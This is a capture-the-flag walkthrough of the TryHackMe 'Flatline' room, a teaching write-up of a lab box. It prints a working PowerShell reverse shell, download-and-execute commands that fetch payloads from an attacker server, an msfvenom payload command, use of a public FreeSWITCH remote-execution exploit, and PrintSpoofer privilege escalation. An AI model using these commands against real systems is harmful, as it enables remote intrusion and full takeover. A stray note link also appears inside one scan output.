---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Flatline
# DESCRIPTION       . How low are your morals?
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/flatline
```

```
sudo nmap -sSVC -T5 -Pn -p- 10.10.118.70 -oN flatline
```

- I've used `-Pn` since it appeared as down and the ping wasn't working against the target. 
- The server was up for ~15 minutes, so I assumed it was fully functional by now.

```
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
|_ssl-date: 2024-02-12T18:24:43+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2024-02-11T18:08:47
|_Not valid after:  2024-08-12T18:08:47
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-12T18:24:39+00:00

8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### PORT 3389

- I started digging deeper into RDP since the port 3389 was open.

```
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -Pn -p 3389 -T5 10.10.118.70
```

```
PORT     STAT[[Tech_Supp0rt 1]]E SERVICE
3389/tcp open  ms-wbt-server
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-12T18:27:13+00:00
```

- However, I had no desire to try bruteforcing for now and I didn't knew what else to do with RDP.

#### PORT 8021 

- After some googling around, I found out that _FreeSWITCH is a free and open-source telephony software for real-time communication protocols using audio, video, text and other forms of media_. 

- I tried connecting with `netcat` to this service and I needed authentication.

```
nc 10.10.118.70 8021
Content-Type: auth/request
```

- After some more googling around, I found out the default password and an exploit written for this [here](https://www.exploit-db.com/exploits/47799).

```
python3 47799.py 10.10.118.70 whoami

Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic
```

- If we have enough privileges, technically we could add a new account to the system and then RDP to it.

- However, I've chosen to create a reverse shell and execute it from memory, since this would be harder to detect in a real life scenario. A new added user to the system pops up :) 

- To do this, I've saved the following Powershell reverse shell in a file called `shell.ps1`.

```
$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

- Then, using the exploit above, I've downloaded it from my python webserver & executed it in memory.

```
(New-Object Net.WebClient).DownloadString('http://IP:PORT/shell.ps1')
```

**NOTE**: Make sure the listener is active, as the reverse shell will get executed automatically after being downloaded.

```
Connection received on 10.10.118.70 49987
whoami
win-eom4pk0578n\nekrotic
PS C:\Program Files\FreeSWITCH> 
```

- Both flags are in `C:\Users\Nekrotic\Desktop`, called `user.txt` and `root.txt`.

- We can read only `user.txt`.

#### PRIVILEGE ESCALATION

```
PS C:\Program Files\FreeSWITCH> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

- We see that we have the `SeImpersonatePrivilege` enabled. 
- This means that we can impersonate any client after we're authenticated (whatever, we skipped the "authentication" part).

- I've used this [PrintSpooler.exe](https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe) to escalate privileges

```
PrintSpoofer exploit that can be used to escalate service user permissions on Windows Server 2016, Server 2019, and Windows 10.

To escalate privileges, the service account must have SeImpersonate privileges. To execute:
```

- However, I couldn't make it work so I've assumed this is because of my unstable shell.

- So I've generated a new shell using msfvenom, hopefully that would be more stable.

```
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe
```

- Then, I've transferred it using `certutil` since it was too big `>8192`, so it coudln't be downloaded by the `DownloadString` method.

```
python3 47799.py 10.10.118.70 "certutil -urlcache -split -f http://ATTACKER_IP:8000/shell.exe"
```

- Then, I've executed it using

```
python3 47799.py 10.10.118.70 shell.exe
```

- The listener was a simple `nc -nvlp 4444`.

- This shell was much more responsive and I was able to run the `PrintSpoofer.exe -i -c cmd` to escalate privileges.

```
C:\Program Files\FreeSWITCH> PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

- The last flag is in `C:\Users\Nekrotic\Desktop\root.txt`. 